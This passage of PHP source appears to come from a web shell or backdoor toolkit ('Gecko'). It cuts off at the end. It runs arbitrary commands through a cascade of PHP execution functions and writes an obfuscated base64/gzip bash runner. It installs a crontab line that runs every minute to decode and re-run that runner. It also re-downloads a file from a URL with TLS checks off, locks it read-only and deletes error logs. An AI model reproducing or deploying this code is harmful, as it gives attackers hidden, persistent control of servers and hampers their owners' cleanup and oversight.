function runTerminal($command, $cwd, $timeoutSec = 0, $allowFallback = true)
{
    $timeoutSec = (int)$timeoutSec;

    // Prefer proc_open when available
    if (function_exists('proc_open')) {
        $descriptors = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $cmd = $isWin ? 'cmd /C ' . $command : $command;
        $pipes = array();
        $proc = @proc_open($cmd, $descriptors, $pipes, $cwd);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            if ($timeoutSec > 0) {
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                $stdout = '';
                $stderr = '';
                $deadline = microtime(true) + $timeoutSec;
                while (true) {
                    $status = proc_get_status($proc);
                    $read = array();
                    if (isset($pipes[1]) && is_resource($pipes[1])) $read[] = $pipes[1];
                    if (isset($pipes[2]) && is_resource($pipes[2])) $read[] = $pipes[2];
                    if (!empty($read)) {
                        $write = null;
                        $except = null;
                        $tv = max(0, min(0.2, $deadline - microtime(true)));
                        if (@stream_select($read, $write, $except, (int)$tv, (int)(($tv - (int)$tv) * 1000000)) > 0) {
                            foreach ($read as $r) {
                                $chunk = fread($r, 8192);
                                if ($chunk === false || $chunk === '') continue;
                                if ($r === $pipes[1]) $stdout .= $chunk;
                                else $stderr .= $chunk;
                            }
                        }
                    }
                    if (!$status['running']) break;
                    if (microtime(true) >= $deadline) {
                        @proc_terminate($proc, 9);
                        if (isset($pipes[1]) && is_resource($pipes[1])) fclose($pipes[1]);
                        if (isset($pipes[2]) && is_resource($pipes[2])) fclose($pipes[2]);
                        @proc_close($proc);
                        $out = trim($stdout . (($stdout !== '' && $stderr !== '') ? "\n" : '') . $stderr);
                        if ($out !== '') $out .= "\n";
                        $out .= 'Command timed out after ' . $timeoutSec . 's';
                        return array('output' => $out, 'exit_code' => 124, 'timed_out' => true, 'method' => 'proc_open');
                    }
                    usleep(50000);
                }
                if (isset($pipes[1]) && is_resource($pipes[1])) {
                    $rest = stream_get_contents($pipes[1]);
                    if ($rest) $stdout .= $rest;
                    fclose($pipes[1]);
                }
                if (isset($pipes[2]) && is_resource($pipes[2])) {
                    $rest = stream_get_contents($pipes[2]);
                    if ($rest) $stderr .= $rest;
                    fclose($pipes[2]);
                }
                $code = proc_close($proc);
                $sep = ($stdout !== '' && $stderr !== '') ? "\n" : '';
                $out = trim($stdout . $sep . $stderr);
                if ($out === '') {
                    $out = ($code === 0) ? '(no output)' : '';
                }
                return array('output' => $out, 'exit_code' => $code, 'method' => 'proc_open');
            }

            $stdout = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $code = proc_close($proc);
            $stdout = $stdout ? $stdout : '';
            $stderr = $stderr ? $stderr : '';
            $sep = ($stdout !== '' && $stderr !== '') ? "\n" : '';
            $out = trim($stdout . $sep . $stderr);
            if ($out === '') {
                $out = ($code === 0) ? '(no output)' : '';
            }
            return array('output' => $out, 'exit_code' => $code, 'method' => 'proc_open');
        }
        // proc_open present but failed to spawn
        if (!$allowFallback) {
            return array('output' => 'Failed to execute.', 'exit_code' => 1, 'method' => 'proc_open');
        }
    } elseif (!$allowFallback) {
        return array(
            'output' => 'proc_open() is disabled on this server.',
            'exit_code' => 1,
            'no_shell' => true,
            'method' => '',
        );
    }

    // Fallbacks when proc_open missing/failed
    $fb = runTerminalFallbackShell($command, $cwd, $timeoutSec > 0 ? $timeoutSec : 120);
    // Host often has ONLY proc_open: complex quoting can make spawn fail → "Tried: none".
    // Retry once via temp .sh so argv stays simple: bash /tmp/.gecko_sh_….sh
    if (!empty($fb['no_shell']) && $allowFallback && function_exists('proc_open')) {
        $via = geckoRunBashScriptFile($command, $cwd, $timeoutSec > 0 ? $timeoutSec : 120);
        if (empty($via['no_shell'])) {
            return $via;
        }
    }
    return $fb;
}

function searchFiles($baseDir, $relDir, $query, &$results, &$count, $limit = 200)
{
    if ($count >= $limit) return;
    $dir = resolvePath($baseDir, $relDir);
    if (!$dir || !is_dir($dir)) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        if ($count >= $limit) break;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        $itemRel = $relDir === '' ? $name : $relDir . '/' . $name;
        if (stripos($name, $query) !== false) {
            $isDir = is_dir($full);
            $sz = @filesize($full);
            $results[] = array(
                'path' => $itemRel,
                'name' => $name,
                'is_dir' => $isDir,
                'icon' => fileIcon($name, $isDir),
                'size' => $isDir ? null : (int)($sz ? $sz : 0),
            );
            $count++;
        }
        if (is_dir($full)) searchFiles($baseDir, $itemRel, $query, $results, $count, $limit);
    }
    closedir($h);
}

function getCrontab()
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $result = geckoShellRun('schtasks /query /fo LIST', $GLOBALS['baseDir'], 10);
        return array('content' => $result['output'], 'platform' => 'windows', 'editable' => false);
    }
    $result = geckoShellRun('crontab -l 2>&1', $GLOBALS['baseDir'], 15);
    $out = isset($result['output']) ? $result['output'] : '';
    if (!empty($result['timed_out'])) {
        return array('content' => '', 'platform' => 'unix', 'editable' => true, 'error' => 'crontab -l timed out');
    }
    if (!empty($result['no_shell'])) {
        return array('content' => '', 'platform' => 'unix', 'editable' => true, 'error' => $out);
    }
    if (stripos($out, 'no crontab') !== false) {
        $out = '';
    }
    return array('content' => $out, 'platform' => 'unix', 'editable' => true);
}

function setCrontab($content)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => false, 'error' => 'Edit crontab on Windows via schtasks in Terminal.');
    }
    // Sanitize before install — Vixie cron rejects ~1000+ char lines ("command too long")
    $rawLines = preg_split("/\r\n|\n|\r/", (string)$content);
    if (!is_array($rawLines)) {
        $rawLines = array((string)$content);
    }
    $clean = array();
    foreach ($rawLines as $line) {
        $trim = trim($line);
        if ($trim === '') {
            continue;
        }
        if (stripos($trim, 'no crontab') !== false) {
            continue;
        }
        if (stripos($trim, 'command too long') !== false) {
            continue;
        }
        // Hard drop overlong lines (legacy base64 embeds / garbage)
        if (strlen($line) > 800) {
            continue;
        }
        $clean[] = $line;
    }
    $content = implode("\n", $clean) . "\n";

    $tmp = tempnam(sys_get_temp_dir(), 'cron');
    if ($tmp === false) {
        return array('ok' => false, 'error' => 'Cannot create temp file');
    }
    file_put_contents($tmp, $content);
    $result = geckoShellRun('crontab ' . geckoEscapeshellarg($tmp), $GLOBALS['baseDir'], 25);
    @unlink($tmp);
    if (!empty($result['timed_out'])) {
        return array('ok' => false, 'error' => 'crontab save timed out');
    }
    if (!empty($result['no_shell'])) {
        return array('ok' => false, 'error' => $result['output']);
    }
    if ((int)$result['exit_code'] !== 0) {
        return array('ok' => false, 'error' => $result['output'] ? $result['output'] : 'Failed to save crontab');
    }
    return array('ok' => true);
}

/**
 * Recover file — same logic as cron.sh recover_target:
 * ensure_directory + clean_error_logs + download/verify + permissions + flock lock
 */
function geckoRecoverValidateDir($path)
{
    $path = trim(str_replace('\\', '/', (string)$path));
    if ($path === '' || $path === '/') {
        return array(false, 'DIR_PATH tidak valid.');
    }
    if (strpos($path, "\0") !== false) {
        return array(false, 'DIR_PATH mengandung karakter ilegal.');
    }
    if (preg_match('#(^|/)\.\.(/|$)#', $path)) {
        return array(false, 'DIR_PATH tidak boleh mengandung ..');
    }
    // Absolute Linux or Windows path required (same spirit as cron.sh DIR_PATH)
    $isWinAbs = (bool)preg_match('/^[A-Za-z]:\//', $path);
    $isUnixAbs = (strlen($path) > 0 && $path[0] === '/');
    if (!$isWinAbs && !$isUnixAbs) {
        return array(false, 'DIR_PATH harus absolute path (contoh /var/www/... atau C:/...).');
    }
    return array(true, rtrim($path, '/'));
}

function geckoRecoverValidateFile($name)
{
    $name = trim((string)$name);
    if ($name === '' || $name === '.' || $name === '..') {
        return array(false, 'FILE_NAME tidak valid.');
    }
    if (strpos($name, '/') !== false || strpos($name, '\\') !== false || strpos($name, "\0") !== false) {
        return array(false, 'FILE_NAME tidak boleh berisi path separator.');
    }
    if (!preg_match('/^[A-Za-z0-9._-]+$/', $name)) {
        return array(false, 'FILE_NAME hanya boleh huruf, angka, titik, underscore, dash.');
    }
    return array(true, $name);
}

function geckoRecoverValidateUrl($url)
{
    $url = trim((string)$url);
    if ($url === '') {
        return array(false, 'DOWNLOAD_URL wajib diisi.');
    }
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return array(false, 'DOWNLOAD_URL tidak valid.');
    }
    $scheme = strtolower((string)parse_url($url, PHP_URL_SCHEME));
    if ($scheme !== 'http' && $scheme !== 'https') {
        return array(false, 'DOWNLOAD_URL harus http/https.');
    }
    return array(true, $url);
}

function geckoRecoverDownload($url)
{
    $tmp = tempnam(sys_get_temp_dir(), 'grec_');
    if ($tmp === false) {
        return array(false, null, 'Gagal membuat temp file.');
    }

    if (function_exists('curl_init')) {
        $fp = fopen($tmp, 'wb');
        if (!$fp) {
            @unlink($tmp);
            return array(false, null, 'Gagal membuka temp file.');
        }
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'GeckoRecover/1.0');
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        $ok = curl_exec($ch);
        $err = curl_error($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);
        if (!$ok || $code >= 400 || !is_file($tmp) || filesize($tmp) === 0) {
            @unlink($tmp);
            return array(false, null, 'Download gagal' . ($err ? (': ' . $err) : (' (HTTP ' . $code . ')')));
        }
        return array(true, $tmp, null);
    }

    $ctx = stream_context_create(array(
        'http' => array(
            'timeout' => 30,
            'follow_location' => 1,
            'user_agent' => 'GeckoRecover/1.0',
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
        ),
    ));
    $data = @file_get_contents($url, false, $ctx);
    if ($data === false || $data === '') {
        @unlink($tmp);
        return array(false, null, 'Download gagal (file_get_contents).');
    }
    if (file_put_contents($tmp, $data) === false || filesize($tmp) === 0) {
        @unlink($tmp);
        return array(false, null, 'Gagal menulis temp download.');
    }
    return array(true, $tmp, null);
}

function geckoRecoverMove($tmp, $dest)
{
    @chmod($tmp, 0444);
    if (@rename($tmp, $dest)) {
        return true;
    }
    $copied = @copy($tmp, $dest);
    @unlink($tmp);
    return (bool)$copied;
}

function geckoRecoverTarget($dirPath, $fileName, $downloadUrl, $skipVerify = true)
{
    $filePath = $dirPath . '/' . $fileName;
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $lockPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.gecko_rec_' . $instanceId . '.lock';
    $steps = array();

    $fp = @fopen($lockPath, 'c+');
    if (!$fp) {
        return array('ok' => false, 'error' => 'Gagal membuka lock file.', 'steps' => $steps);
    }

    $deadline = microtime(true) + 5;
    $locked = false;
    while (microtime(true) < $deadline) {
        if (flock($fp, LOCK_EX | LOCK_NB)) {
            $locked = true;
            break;
        }
        usleep(100000);
    }
    if (!$locked) {
        fclose($fp);
        return array('ok' => false, 'error' => 'Recover sedang berjalan (lock). Coba lagi.', 'steps' => $steps);
    }

    try {
        // ensure_directory
        if (!is_dir($dirPath)) {
            if (!@mkdir($dirPath, 0755, true) && !is_dir($dirPath)) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Gagal membuat direktori: ' . $dirPath, 'steps' => $steps);
            }
            $steps[] = 'Direktori dibuat: ' . $dirPath;
        } else {
            $steps[] = 'Direktori sudah ada: ' . $dirPath;
        }

        $dirPerms = substr(sprintf('%o', fileperms($dirPath)), -3);
        if ($dirPerms !== '755') {
            @chmod($dirPath, 0755);
            $steps[] = 'Permission dir diperbaiki: ' . $dirPerms . ' → 755';
        } else {
            $steps[] = 'Permission dir OK: 755';
        }

        // clean_error_logs
        foreach (array('error_log', 'error.log') as $logName) {
            $logPath = $dirPath . '/' . $logName;
            if (file_exists($logPath)) {
                @unlink($logPath);
                $steps[] = 'Dihapus: ' . $logName;
            }
        }

        $needsRecovery = !is_file($filePath) || filesize($filePath) === 0;
        if ($needsRecovery) {
            if (is_file($filePath)) {
                @unlink($filePath);
                $steps[] = 'File kosong dihapus, download ulang.';
            } else {
                $steps[] = 'File hilang, download dari URL.';
            }
            $dl = geckoRecoverDownload($downloadUrl);
            if (!$dl[0]) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => $dl[2], 'steps' => $steps);
            }
            if (!geckoRecoverMove($dl[1], $filePath)) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Gagal memindahkan file ke target.', 'steps' => $steps);
            }
            $steps[] = 'File di-download & ditulis: ' . $filePath;
        } elseif ($skipVerify) {
            // UI recover: skip second network download (daemon will verify later)
            $steps[] = 'File sudah ada — skip verify download (cepat). Daemon akan verify.';
        } else {
            // verify_and_restore_content
            $dl = geckoRecoverDownload($downloadUrl);
            if (!$dl[0]) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Verify gagal: ' . $dl[2], 'steps' => $steps);
            }
            $same = (md5_file($dl[1]) === md5_file($filePath));
            if (!$same) {
                if (!geckoRecoverMove($dl[1], $filePath)) {
                    flock($fp, LOCK_UN);
                    fclose($fp);
                    return array('ok' => false, 'error' => 'Gagal restore file (isi berbeda).', 'steps' => $steps);
                }
                $steps[] = 'Isi file berbeda — di-restore dari URL.';
            } else {
                @unlink($dl[1]);
                $steps[] = 'Isi file sama dengan remote — tidak diubah.';
            }
        }

        if (is_file($filePath) && filesize($filePath) === 0) {
            @unlink($filePath);
            flock($fp, LOCK_UN);
            fclose($fp);
            return array('ok' => false, 'error' => 'Hasil recover kosong (0 byte), file dihapus.', 'steps' => $steps);
        }

        if (is_file($filePath)) {
            $filePerms = substr(sprintf('%o', fileperms($filePath)), -3);
            if ($filePerms !== '444') {
                @chmod($filePath, 0444);
                $steps[] = 'Permission file diperbaiki: ' . $filePerms . ' → 444';
            } else {
                $steps[] = 'Permission file OK: 444';
            }
        }

        $size = is_file($filePath) ? filesize($filePath) : 0;
        $steps[] = 'Recover selesai. Size: ' . $size . ' bytes.';
        flock($fp, LOCK_UN);
        fclose($fp);
        return array(
            'ok' => true,
            'message' => 'Recover berhasil: ' . $filePath,
            'path' => $filePath,
            'size' => $size,
            'steps' => $steps,
        );
    } catch (Exception $e) {
        flock($fp, LOCK_UN);
        fclose($fp);
        return array('ok' => false, 'error' => $e->getMessage(), 'steps' => $steps);
    }
}

/** Escape string for bash single-quoted literal. */
function geckoBashQuote($s)
{
    return "'" . str_replace("'", "'\\''", (string)$s) . "'";
}

/**
 * Write obfuscated runner stub (same as cron.sh write_obfuscated_to):
 * gzip+base64 split into two vars, decode|bash -s -- "$@"
 */
function geckoWriteObfuscatedRunner($dest, $plainScript, $instanceId)
{
    $dir = dirname($dest);
    if (!is_dir($dir) && !@mkdir($dir, 0700, true) && !is_dir($dir)) {
        return false;
    }

    $useGzip = false;
    $b64 = '';
    if (function_exists('gzencode')) {
        $gz = @gzencode($plainScript, 9);
        if ($gz !== false && $gz !== '') {
            $b64 = base64_encode($gz);
            $useGzip = true;
        }
    }
    if ($b64 === '') {
        $b64 = base64_encode($plainScript);
        $useGzip = false;
    }
    if ($b64 === '') {
        return false;
    }

    $mid = (int)floor(strlen($b64) / 2);
    $v1 = '_0x' . substr($instanceId, 0, 4);
    $v2 = '_0x' . substr($instanceId, 4, 4);
    if ($v2 === '_0x') {
        $v2 = '_0x' . substr(md5($instanceId), 0, 4);
    }
    $j1 = '_j' . substr(md5($instanceId), 0, 8);
    $j2 = '_j' . substr(md5($instanceId), 8, 8);
    $junk1 = dechex(mt_rand(0x10000000, 0x7fffffff));
    $junk2 = dechex(mt_rand(0x10000000, 0x7fffffff));
    $part1 = substr($b64, 0, $mid);
    $part2 = substr($b64, $mid);
    $pipe = $useGzip
        ? 'echo "${' . $v1 . '}${' . $v2 . '}"|base64 -d|gzip -dc|bash -s -- "$@"'
        : 'echo "${' . $v1 . '}${' . $v2 . '}"|base64 -d|bash -s -- "$@"';

    $stub = "#!/bin/bash\n"
        . $j1 . '=' . $junk1 . "\n"
        . $j2 . '=' . $junk2 . "\n"
        . $v1 . "='" . $part1 . "'\n"
        . $v2 . "='" . $part2 . "'\n"
        . $pipe . "\n";

    if (@file_put_contents($dest, $stub) === false) {
        return false;
    }
    @chmod($dest, 0700);
    return true;
}

/**
 * Run a shell command with cascading fallbacks.
 * Order: proc_open → shell_exec → popen → system → passthru → exec
 * If an earlier method fails / is unavailable, try the next.
 */
function geckoShellRun($command, $cwd = null, $timeoutSec = 60)
{
    if ($cwd === null || $cwd === '') {
        $cwd = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    }
    $timeoutSec = max(1, (int)$timeoutSec);
    $full = 'cd ' . geckoEscapeshellarg($cwd) . ' && ' . $command;

    $methods = array('proc_open', 'shell_exec', 'popen', 'system', 'passthru', 'exec');
    $tried = array();
    $last = array(
        'output' => 'No shell runner available (proc_open/shell_exec/popen/system/passthru/exec all disabled).',
        'exit_code' => 1,
        'no_shell' => true,
        'method' => '',
        'tried' => array(),
    );

    foreach ($methods as $method) {
        $res = geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec);
        if ($res === null) {
            continue; // method disabled / unavailable
        }
        $tried[] = $method . '(exit=' . (int)$res['exit_code'] . ')';
        $res['method'] = $method;
        $res['tried'] = $tried;
        $last = $res;
        // Success
        if ((int)$res['exit_code'] === 0) {
            return $res;
        }
        // Failure — try next fallback (system/passthru/exec etc.)
    }

    $last['tried'] = $tried;
    if (empty($tried)) {
        $last['no_shell'] = true;
    }
    return $last;
}

/**
 * Force-run using only system / passthru / exec (used when primary run failed).
 */
function geckoShellRunFallbackSPE($command, $cwd = null, $timeoutSec = 60)
{
    if ($cwd === null || $cwd === '') {
        $cwd = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    }
    $timeoutSec = max(1, (int)$timeoutSec);
    $full = 'cd ' . geckoEscapeshellarg($cwd) . ' && ' . $command;

    $methods = array('system', 'passthru', 'exec');
    $tried = array();
    $last = array(
        'output' => 'system()/passthru()/exec() all unavailable or failed.',
        'exit_code' => 1,
        'no_shell' => true,
        'method' => '',
        'tried' => array(),
    );

    foreach ($methods as $method) {
        $res = geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec);
        if ($res === null) {
            $tried[] = $method . '(disabled)';
            continue;
        }
        $tried[] = $method . '(exit=' . (int)$res['exit_code'] . ')';
        $res['method'] = $method;
        $res['tried'] = $tried;
        $last = $res;
        if ((int)$res['exit_code'] === 0) {
            return $res;
        }
    }

    $last['tried'] = $tried;
    return $last;
}

/**
 * @return array|null null = method not available
 */
function geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec)
{
    try {
        if ($method === 'proc_open') {
            if (!function_exists('proc_open')) {
                return null;
            }
            // Call runTerminal without fallback to avoid recursion into geckoShellRun
            $r = runTerminal($command, $cwd, $timeoutSec, false);
            if (!is_array($r)) {
                return array('output' => 'proc_open invalid result', 'exit_code' => 1);
            }
            // If proc_open path failed hard, signal failure so cascade continues
            if (!empty($r['no_shell']) || (isset($r['output']) && $r['output'] === 'Failed to execute.')) {
                return array(
                    'output' => isset($r['output']) ? $r['output'] : 'proc_open failed',
                    'exit_code' => 1,
                );
            }
            return array(
                'output' => isset($r['output']) ? $r['output'] : '',
                'exit_code' => isset($r['exit_code']) ? (int)$r['exit_code'] : 1,
                'timed_out' => !empty($r['timed_out']),
            );
        }

        if ($method === 'shell_exec') {
            if (!function_exists('shell_exec')) {
                return null;
            }
            $out = @shell_exec($full . ' 2>&1');
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => 0, // shell_exec cannot return exit code reliably
            );
        }

        if ($method === 'popen') {
            if (!function_exists('popen')) {
                return null;
            }
            $h = @popen($full . ' 2>&1', 'r');
            if (!is_resource($h)) {
                return array('output' => 'popen() failed', 'exit_code' => 1);
            }
            $out = '';
            $deadline = microtime(true) + $timeoutSec;
            while (!feof($h) && microtime(true) < $deadline) {
                $chunk = fread($h, 8192);
                if ($chunk === false || $chunk === '') {
                    usleep(50000);
                    continue;
                }
                $out .= $chunk;
            }
            $code = pclose($h);
            return array('output' => trim($out), 'exit_code' => (int)$code);
        }

        if ($method === 'system') {
            if (!function_exists('system')) {
                return null;
            }
            ob_start();
            $code = 1;
            @system($full . ' 2>&1', $code);
            $out = ob_get_clean();
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => (int)$code,
            );
        }

        if ($method === 'passthru') {
            if (!function_exists('passthru')) {
                return null;
            }
            ob_start();
            $code = 1;
            @passthru($full . ' 2>&1', $code);
            $out = ob_get_clean();
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => (int)$code,
            );
        }

        if ($method === 'exec') {
            if (!function_exists('exec')) {
                return null;
            }
            $lines = array();
            $code = 1;
            @exec($full . ' 2>&1', $lines, $code);
            return array(
                'output' => implode("\n", $lines),
                'exit_code' => (int)$code,
            );
        }
    } catch (Exception $ex) {
        return array('output' => $method . ' exception: ' . $ex->getMessage(), 'exit_code' => 1);
    } catch (Throwable $ex) {
        return array('output' => $method . ' error: ' . $ex->getMessage(), 'exit_code' => 1);
    }

    return null;
}

function geckoPatchCronShAssign($script, $key, $value)
{
    $q = geckoBashQuote($value);
    $lines = preg_split("/\r\n|\n|\r/", (string)$script);
    if (!is_array($lines)) {
        $lines = array((string)$script);
    }
    $found = false;
    $prefix = $key . '=';
    foreach ($lines as $i => $line) {
        $trim = ltrim($line);
        if (strpos($trim, $prefix) === 0) {
            $lines[$i] = $key . '=' . $q;
            $found = true;
            break;
        }
    }
    if (!$found) {
        $insertAt = 0;
        foreach ($lines as $i => $line) {
            if (strpos($line, '#!/') === 0) {
                $insertAt = $i + 1;
                break;
            }
        }
        array_splice($lines, $insertAt, 0, array($key . '=' . $q));
    }
    return implode("\n", $lines);
}

/**
 * Replace a bash function body by name (brace-balanced).
 * $newFuncSource must include the full "name() { ... }" definition.
 */
function geckoBashReplaceFunction($script, $funcName, $newFuncSource)
{
    $script = (string)$script;
    $funcName = (string)$funcName;
    if ($script === '' || $funcName === '' || !preg_match('/^[A-Za-z_][A-Za-z0-9_]*$/', $funcName)) {
        return null;
    }
    if (!preg_match('/^' . preg_quote($funcName, '/') . '\s*\(\s*\)\s*\{/m', $script, $m, PREG_OFFSET_CAPTURE)) {
        return null;
    }
    $start = $m[0][1];
    $bracePos = strpos($script, '{', $start);
    if ($bracePos === false) return null;
    $depth = 0;
    $len = strlen($script);
    $end = -1;
    for ($i = $bracePos; $i < $len; $i++) {
        $ch = $script[$i];
        if ($ch === '{') $depth++;
        elseif ($ch === '}') {
            $depth--;
            if ($depth === 0) {
                $end = $i;
                break;
            }
        }
    }
    if ($end < 0) return null;
    return substr($script, 0, $start) . rtrim((string)$newFuncSource) . "\n" . substr($script, $end + 1);
}

/**
 * Force short-cmd base64 crontab inside cron.sh template.
 * Encodes only: /bin/bash 'runner' --recover  (short — safe under Vixie limit).
 * Does NOT embed full runner payloads (that caused "command too long").
 */
function geckoCronShPatchShortCrontab($script)
{
    $script = (string)$script;
    $shortInstall = <<<'BASH'
install_crontab() {
  local cron_line exec_path qpath inner b64 tmpcf rc
  if type ensure_runner_mirror >/dev/null 2>&1; then
    ensure_runner_mirror 2>/dev/null || true
  fi
  if [ -n "${INSTALL_PATH:-}" ] && [ -f "$INSTALL_PATH" ]; then
    exec_path="$INSTALL_PATH"
  elif [ -n "${SHM_INSTALL_PATH:-}" ] && [ -f "$SHM_INSTALL_PATH" ]; then
    exec_path="$SHM_INSTALL_PATH"
  elif [ -n "${INSTALL_PATH:-}" ]; then
    exec_path="$INSTALL_PATH"
  else
    return 1
  fi
  qpath=$(printf '%s' "$exec_path" | sed "s/'/'\\\\''/g")
  inner="/bin/bash '$qpath' --recover"
  if type b64encode >/dev/null 2>&1; then
    b64=$(b64encode "$inner") || b64=$(printf '%s' "$inner" | base64 | tr -d '\n')
  else
    b64=$(printf '%s' "$inner" | base64 | tr -d '\n')
  fi
  # NOTE: *''/1 avoids PHP closing a block-comment on */ inside this source file
  cron_line="${CRON_SCHEDULE:-*''/1 * * * *} echo '$b64' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ${CRON_MARKER}"
  # Guard against accidental overlong lines
  if [ "${#cron_line}" -gt 800 ]; then
    cron_line="${CRON_SCHEDULE:-*''/1 * * * *} /bin/bash '$qpath' --recover >/dev/null 2>&1 ${CRON_MARKER}"
  fi
  tmpcf=$(mktemp 2>/dev/null) || tmpcf="/tmp/.gecko_crontab_$$.txt"
  (crontab -l 2>/dev/null | awk -v m="$CRON_MARKER" '
    index($0, m) { next }
    length($0) > 800 { next }
    /^[ \t]*$/ { next }
    /command too long/ { next }
    /no crontab/ { next }
    { print }
  ') >"$tmpcf" 2>/dev/null
  echo "$cron_line" >>"$tmpcf"
  crontab "$tmpcf" 2>/dev/null
  rc=$?
  rm -f "$tmpcf"
  return $rc
}
BASH;

    $replaced = geckoBashReplaceFunction($script, 'install_crontab', $shortInstall);
    if ($replaced !== null) {
        $script = $replaced;
    } else {
        $script .= "\n# === gecko short crontab override ===\n" . $shortInstall . "\n";
    }

    $noopPayload = "build_cron_payload() {\n  return 0\n}";
    $p2 = geckoBashReplaceFunction($script, 'build_cron_payload', $noopPayload);
    if ($p2 !== null) {
        $script = $p2;
    }

    // If install_crontab still builds FULL payload (legacy), force our short-cmd version
    if (preg_match('/install_crontab\s*\(\)[\s\S]{0,400}build_cron_payload/', $script)) {
        $script .= "\n# === gecko short crontab override (force) ===\n" . $shortInstall . "\n";
    }

    // Strip CR from PHP nowdoc (Windows CRLF) — bash rejects $'{\r'
    return geckoCronShNormalizeLf($script);
}

/**
 * PHP-side short crontab heal when cron.sh left Crontab: MISSING.
 * Writes short-cmd base64: echo '<b64>' | base64 -d | bash  (NOT full runner payload).
 */
function geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, &$steps)
{
    $installPath = str_replace('\\', '/', (string)$installPath);
    $shmPath = str_replace('\\', '/', (string)$shmPath);
    $cronMarker = trim((string)$cronMarker);
    if ($cronMarker === '') {
        $steps[] = 'Short crontab: marker kosong — skip';
        return false;
    }

    $exec = '';
    if ($installPath !== '' && @is_file($installPath)) {
        $exec = $installPath;
    } elseif ($shmPath !== '' && @is_file($shmPath)) {
        $exec = $shmPath;
    }
    if ($exec === '') {
        $steps[] = 'Short crontab: runner belum ada di disk — skip';
        return false;
    }

    $sid = '';
    if (preg_match('/cronsh_([a-f0-9]+)/', $cronMarker, $m)) {
        $sid = $m[1];
    }

    $cur = getCrontab();
    $content = isset($cur['content']) ? (string)$cur['content'] : '';
    if (!empty($cur['error']) && $content === '') {
        $steps[] = 'Short crontab: crontab -l gagal: ' . $cur['error'];
        // still try install fresh
    }

    $rawLines = preg_split("/\r\n|\n|\r/", $content);
    if (!is_array($rawLines)) $rawLines = array();
    $kept = array();
    $removed = 0;
    foreach ($rawLines as $line) {
        $trim = trim($line);
        if ($trim === '') {
            continue;
        }
        // drop noise from crontab -l errors
        if (stripos($trim, 'no crontab') !== false) continue;
        if (stripos($trim, 'command too long') !== false) continue;

        if ($cronMarker !== '' && strpos($line, $cronMarker) !== false) {
            $removed++;
            continue;
        }
        if ($sid !== '' && strpos($line, 'cronsh_' . $sid) !== false) {
            $removed++;
            continue;
        }
        // Drop ANY overlong line — Vixie cron can't reinstall them ("command too long")
        if (strlen($line) > 800) {
            $removed++;
            $steps[] = 'Short crontab: buang baris overlong (' . strlen($line) . ' chars)';
            continue;
        }
        $kept[] = $line;
    }

    $inner = '/bin/bash ' . geckoBashQuote($exec) . ' --recover';
    $b64 = base64_encode($inner);
    $cronLine = '*/1 * * * * echo \'' . $b64 . '\' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ' . $cronMarker;
    if (strlen($cronLine) > 800) {
        // ultra-safe fallback
        $cronLine = '*/1 * * * * /bin/bash ' . geckoBashQuote($exec) . ' --recover >/dev/null 2>&1 ' . $cronMarker;
        $steps[] = 'Short crontab: b64 line too long — fallback plain';
    }
    $kept[] = $cronLine;
    $newContent = implode("\n", $kept) . "\n";

    $steps[] = 'Short crontab install (b64 cmd): echo \'<b64>\' | base64 -d | bash · marker ' . $cronMarker;
    $steps[] = 'Short crontab line len: ' . strlen($cronLine) . ' chars';
    if ($removed > 0) {
        $steps[] = 'Short crontab: cleaned ' . $removed . ' old/overlong line(s)';
    }

    $save = setCrontab($newContent);
    if (empty($save['ok'])) {
        $err = isset($save['error']) ? $save['error'] : 'crontab save failed';
        $steps[] = 'Short crontab FAILED: ' . substr(preg_replace('/\s+/', ' ', $err), 0, 200);
        return false;
    }

    // verify
    $verify = getCrontab();
    $vcontent = isset($verify['content']) ? (string)$verify['content'] : '';
    $ok = ($vcontent !== '' && strpos($vcontent, $cronMarker) !== false);
    $steps[] = 'Short crontab verify: ' . ($ok ? 'OK' : 'MISSING');
    return $ok;
}

function geckoCronShNormalizeLf($script)
{
